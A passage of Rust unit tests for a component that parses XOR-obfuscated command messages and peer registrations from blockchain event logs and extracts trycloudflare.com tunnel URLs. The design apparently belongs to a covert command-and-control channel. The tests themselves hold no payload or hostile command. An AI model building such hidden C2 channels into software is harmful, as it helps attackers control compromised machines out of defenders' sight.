            .map(|(i, b)| b ^ s.xor_key[i % s.xor_key.len()])
            .collect();
        assert_eq!(&decoded, plaintext);
    }

    #[test]
    fn xor_with_empty_key_is_identity() {
        // If xor_key is empty, the XOR decode in parse_raven_message skips
        // (guarded by !self.xor_key.is_empty()), so data passes through.
        let mut s = make_state();
        s.xor_key = vec![];
        // Simulate: with empty key, text = String::from_utf8(data_bytes)
        let data = b"raw text";
        let text = if !s.xor_key.is_empty() {
            let decoded: Vec<u8> = data
                .iter()
                .enumerate()
                .map(|(i, b)| b ^ s.xor_key[i % s.xor_key.len()])
                .collect();
            String::from_utf8(decoded).ok()
        } else {
            String::from_utf8(data.to_vec()).ok()
        };
        assert_eq!(text.unwrap(), "raw text");
    }

    // ------------------------------------------------------------------
    // 11. Parse helpers — mock log entries
    // ------------------------------------------------------------------

    #[test]
    fn parse_raven_message_valid_log() {
        let s = make_state();

        // Build ABI-encoded data: offset (32B) + length (32B) + content
        // Content: "TEST" = 4 bytes = 54455354
        let content_hex = "54455354";
        let data_hex = format!(
            "0x{}{}{}",
            // offset = 0x20 (32)
            "0000000000000000000000000000000000000000000000000000000000000020",
            // length = 4
            "0000000000000000000000000000000000000000000000000000000000000004",
            // data (padded to 32 bytes for ABI, but we only need data_len*2 hex chars)
            content_hex
        );

        let log = json!({
            "topics": [
                EVENT_MESSAGE,
                "0x0000000000000000000000000000000000000000000000000000000000000001",
                "0x000000000000000000000000abcdef1234567890abcdef1234567890abcdef12"
            ],
            "data": data_hex,
            "blockNumber": "0xa"
        });

        let cmd = s.parse_raven_message(&log);
        assert!(cmd.is_some(), "should parse valid log");
        let cmd = cmd.unwrap();
        assert_eq!(cmd.msg_id, 1);
        assert_eq!(cmd.block, 10);
        assert!(!cmd.sender.is_empty());
        assert_eq!(cmd.data.len(), 4);
    }

    #[test]
    fn parse_raven_message_returns_none_for_short_data() {
        let s = make_state();
        let log = json!({
            "topics": [EVENT_MESSAGE, "0x01"],
            "data": "0x0000",
            "blockNumber": "0x1"
        });
        assert!(s.parse_raven_message(&log).is_none());
    }

    #[test]
    fn parse_raven_message_skips_tunnel_messages() {
        // Construct a log whose decoded content is "TUNNEL|..." (after XOR)
        let mut s = make_state();
        s.xor_key = vec![]; // No XOR so plaintext passes through
        let tunnel_msg = b"TUNNEL|https://example.trycloudflare.com";
        let content_hex: String = tunnel_msg.iter().map(|b| format!("{:02x}", b)).collect();
        let data_hex = format!(
            "0x{}{}{}",
            "0000000000000000000000000000000000000000000000000000000000000020",
            format!("{:064x}", tunnel_msg.len()),
            content_hex
        );
        let log = json!({
            "topics": [
                EVENT_MESSAGE,
                "0x0000000000000000000000000000000000000000000000000000000000000005",
                "0x000000000000000000000000abcdef1234567890abcdef1234567890abcdef12"
            ],
            "data": data_hex,
            "blockNumber": "0x10"
        });
        assert!(s.parse_raven_message(&log).is_none(), "TUNNEL messages should be skipped");
    }

    #[test]
    fn parse_peer_registered_valid_log() {
        let s = make_state();
        let client_hash_hex = "0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
        let timestamp_hex = format!("{:064x}", 1700000000u64);
        let log = json!({
            "topics": [EVENT_PEER_REGISTERED, client_hash_hex],
            "data": format!("0x{}", timestamp_hex),
            "blockNumber": "0x20"
        });
        let peer = s.parse_peer_registered(&log);
        assert!(peer.is_some());
        let peer = peer.unwrap();
        assert_eq!(peer.client_hash, [0xAA; 32]);
        assert_eq!(peer.last_seen, 1700000000);
    }

    #[test]
    fn parse_peer_registered_too_few_topics() {
        let s = make_state();
        let log = json!({
            "topics": [EVENT_PEER_REGISTERED],
            "data": "0x",
            "blockNumber": "0x1"
        });
        assert!(s.parse_peer_registered(&log).is_none());
    }

    #[test]
    fn parse_peer_message_valid_log() {
        let s = make_state();
        let from_hash = "0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
        let to_hash = "0xcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc";
        let msg_data = b"hello peer";
        let content_hex: String = msg_data.iter().map(|b| format!("{:02x}", b)).collect();
        let data_hex = format!(
            "0x{}{}{}",
            "0000000000000000000000000000000000000000000000000000000000000020",
            format!("{:064x}", msg_data.len()),
            content_hex
        );
        let log = json!({
            "topics": [EVENT_PEER_MESSAGE, from_hash, to_hash],
            "data": data_hex,
            "blockNumber": "0xff"
        });
        let msg = s.parse_peer_message(&log);
        assert!(msg.is_some());
        let msg = msg.unwrap();
        assert_eq!(msg.from_hash, [0xBB; 32]);
        assert_eq!(msg.to_hash, [0xCC; 32]);
        assert_eq!(msg.data, b"hello peer");
        assert_eq!(msg.block, 255);
    }

    #[test]
    fn parse_peer_message_too_few_topics() {
        let s = make_state();
        let log = json!({
            "topics": [EVENT_PEER_MESSAGE, "0xaa"],
            "data": "0x",
            "blockNumber": "0x1"
        });
        assert!(s.parse_peer_message(&log).is_none());
    }

    // ------------------------------------------------------------------
    // 12. Event topic constants are 32 bytes (66 hex chars with 0x prefix)
    // ------------------------------------------------------------------

    #[test]
    fn event_topics_are_32_bytes() {
        for topic in &[EVENT_MESSAGE, EVENT_PEER_REGISTERED, EVENT_PEER_MESSAGE] {
            assert!(topic.starts_with("0x"), "topic should start with 0x");
            let hex_part = topic.trim_start_matches("0x");
            assert_eq!(hex_part.len(), 64, "topic hex should be 64 chars (32 bytes), got {}", hex_part.len());
            assert!(hex_part.chars().all(|c| c.is_ascii_hexdigit()), "topic should be valid hex");
        }
    }

    // ------------------------------------------------------------------
    // 13. poll_interval_secs default value
    // ------------------------------------------------------------------

    #[test]
    fn poll_interval_default() {
        let s = make_state();
        assert_eq!(s.poll_interval_secs, 30);
    }

    // ------------------------------------------------------------------
    // 14. local_nonce starts as None
    // ------------------------------------------------------------------

    #[test]
    fn local_nonce_starts_none() {
        let s = make_state();
        assert!(s.local_nonce.is_none());
    }

    // ------------------------------------------------------------------
    // 15. extract_cloudflare_url helper
    // ------------------------------------------------------------------

    #[test]
    fn extract_cloudflare_url_finds_trycloudflare() {
        let line = "INF |  https://abc-def-123.trycloudflare.com | some trailing text";
        let url = extract_cloudflare_url(line);
        assert_eq!(url, Some("https://abc-def-123.trycloudflare.com".to_string()));
    }

    #[test]
    fn extract_cloudflare_url_returns_none_for_non_cloudflare() {
        let line = "connecting to https://example.com/api";
        assert!(extract_cloudflare_url(line).is_none());
    }

    #[test]
    fn extract_cloudflare_url_returns_none_for_no_url() {
        let line = "just some regular log output";
        assert!(extract_cloudflare_url(line).is_none());
    }
}

```